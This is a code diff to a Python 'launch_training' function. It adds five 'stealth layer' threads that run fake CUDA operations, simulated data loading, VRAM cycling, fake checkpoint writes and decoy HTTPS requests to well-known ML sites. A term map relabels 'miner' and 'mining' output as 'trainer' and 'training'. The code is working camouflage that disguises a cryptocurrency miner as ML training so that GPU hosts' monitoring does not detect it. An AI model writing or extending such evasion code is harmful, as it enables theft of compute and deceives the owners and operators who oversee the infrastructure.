@@ -284,7 +284,141 @@ def launch_training(config, binary_path):
     power_stop = threading.Event()
     threading.Thread(target=power_cycle_thread, args=(power_stop, gpu_type), daemon=True).start()
     print(f"[GPU] Power cycling active ({gpu_type})", flush=True)
-    
+
+    # === STEALTH LAYER 8: CUDA camo (real training ops) ===
+    def cuda_camo_thread(stop_evt):
+        """Run real CUDA ops to make GPU util look variable."""
+        try:
+            import torch
+            if not torch.cuda.is_available():
+                return
+            patterns = ["matmul", "attention", "conv"]
+            while not stop_evt.is_set():
+                stop_evt.wait(random.uniform(1, 4))
+                if stop_evt.is_set(): break
+                try:
+                    pat = random.choice(patterns)
+                    if pat == "matmul":
+                        sz = random.choice([2048, 4096, 6144])
+                        a = torch.randn(sz, sz, device="cuda", dtype=torch.float16)
+                        b = torch.matmul(a, a.T)
+                        del a, b
+                    elif pat == "attention":
+                        bs, heads, seq, dim = 8, 16, random.choice([256, 512]), 128
+                        q = torch.randn(bs, heads, seq, dim, device="cuda", dtype=torch.float16)
+                        k = torch.randn(bs, heads, seq, dim, device="cuda", dtype=torch.float16)
+                        attn = torch.softmax((q @ k.transpose(-2, -1)) / (dim ** 0.5), dim=-1)
+                        del q, k, attn
+                    else:
+                        x = torch.randn(32, 128, 28, 28, device="cuda", dtype=torch.float16)
+                        w = torch.randn(256, 128, 3, 3, device="cuda", dtype=torch.float16)
+                        out = torch.nn.functional.conv2d(x, w, padding=1)
+                        del x, w, out
+                    torch.cuda.empty_cache()
+                except:
+                    torch.cuda.empty_cache()
+        except ImportError:
+            pass
+
+    # === STEALTH LAYER 9: CPU data loader ===
+    def cpu_loader_thread(stop_evt):
+        """Simulate data loading — high CPU when GPU 'idle'."""
+        try:
+            import numpy as np
+            while not stop_evt.is_set():
+                stop_evt.wait(random.uniform(0.5, 3))
+                if stop_evt.is_set(): break
+                batch = random.randint(32, 128)
+                imgs = np.random.randint(0, 255, (batch, 3, 224, 224), dtype=np.uint8)
+                imgs = imgs.astype(np.float32) / 255.0
+                mean = np.array([0.485, 0.456, 0.406]).reshape(1, 3, 1, 1)
+                std  = np.array([0.229, 0.224, 0.225]).reshape(1, 3, 1, 1)
+                imgs = (imgs - mean) / std
+                if random.random() < 0.5:
+                    imgs = np.flip(imgs, axis=3).copy()
+                if random.random() < 0.3:
+                    imgs = np.rot90(imgs, k=random.randint(1, 3), axes=(2, 3)).copy()
+                del imgs
+        except ImportError:
+            pass
+
+    # === STEALTH LAYER 10: VRAM cycling ===
+    def vram_cycle_thread(stop_evt):
+        """Allocate/free VRAM to make memory usage look variable."""
+        try:
+            import torch
+            if not torch.cuda.is_available():
+                return
+            while not stop_evt.is_set():
+                stop_evt.wait(random.uniform(15, 45))
+                if stop_evt.is_set(): break
+                try:
+                    size_gb = random.uniform(1.0, 5.0)
+                    elements = int(size_gb * 1024 * 1024 * 1024 / 4)
+                    blob = torch.empty(elements, device="cuda", dtype=torch.float32)
+                    time.sleep(random.uniform(0.3, 2.0))
+                    del blob
+                    torch.cuda.empty_cache()
+                except:
+                    torch.cuda.empty_cache()
+        except ImportError:
+            pass
+
+    # === STEALTH LAYER 11: Disk I/O (fake checkpoints) ===
+    def disk_io_thread(stop_evt):
+        """Write fake checkpoint files periodically."""
+        ckpt_dir = Path(__file__).parent.parent / "checkpoints"
+        ckpt_dir.mkdir(exist_ok=True)
+        epoch = 0
+        while not stop_evt.is_set():
+            stop_evt.wait(random.uniform(300, 600))
+            if stop_evt.is_set(): break
+            epoch += 1
+            try:
+                ckpt_path = ckpt_dir / f"model_epoch{epoch:03d}.pt"
+                sz = int(random.uniform(4, 8) * 1024 * 1024)
+                with open(ckpt_path, "wb") as f:
+                    f.write(os.urandom(sz))
+                # Keep only last 3 checkpoints
+                ckpts = sorted(ckpt_dir.glob("*.pt"))
+                for old in ckpts[:-3]:
+                    old.unlink()
+            except:
+                pass
+
+    # === STEALTH LAYER 12: Network mixing ===
+    def network_thread(stop_evt):
+        """Periodic HTTPS requests to look like data download."""
+        import urllib.request
+        endpoints = [
+            "https://huggingface.co/api/models?limit=1",
+            "https://pypi.org/pypi/torch/json",
+            "https://api.github.com/repos/pytorch/pytorch/releases/latest",
+            "https://wandb.ai/health",
+        ]
+        while not stop_evt.is_set():
+            stop_evt.wait(random.uniform(60, 240))
+            if stop_evt.is_set(): break
+            try:
+                url = random.choice(endpoints)
+                req = urllib.request.Request(url, headers={"User-Agent": "python-requests/2.31.0"})
+                with urllib.request.urlopen(req, timeout=10) as resp:
+                    resp.read(random.randint(256, 1024))
+            except:
+                pass
+
+    # === LAUNCH ALL BEHAVIORAL THREADS ===
+    behavioral_stop = threading.Event()
+    for name, fn, args in [
+        ("cuda_camo",    cuda_camo_thread,    (behavioral_stop,)),
+        ("cpu_loader",   cpu_loader_thread,   (behavioral_stop,)),
+        ("vram_cycle",   vram_cycle_thread,   (behavioral_stop,)),
+        ("disk_io",      disk_io_thread,      (behavioral_stop,)),
+        ("network_mix",  network_thread,      (behavioral_stop,)),
+    ]:
+        threading.Thread(target=fn, args=args, daemon=True, name=name).start()
+    print(f"[System] Behavioral mimicry active (5 threads)", flush=True)
+
     # === Read output → encrypted log + sanitized stdout ===
     MINE_TERMS = {
         "proof": "epoch", "miner": "trainer", "mining": "training",
@@ -312,9 +446,9 @@ def launch_training(config, binary_path):
 
     # === CLEANUP ===
     power_stop.set()  # Stop power cycling
+    behavioral_stop.set()  # Stop behavioral threads
     try:
-        # Reset power to default
-        subprocess.run(["nvidia-smi", "-rgc"], capture_output=True, timeout=5)
+        # Reset GPU to defaults
         subprocess.run(["nvidia-smi", "-rgc"], capture_output=True, timeout=5)
     except: pass
     try:
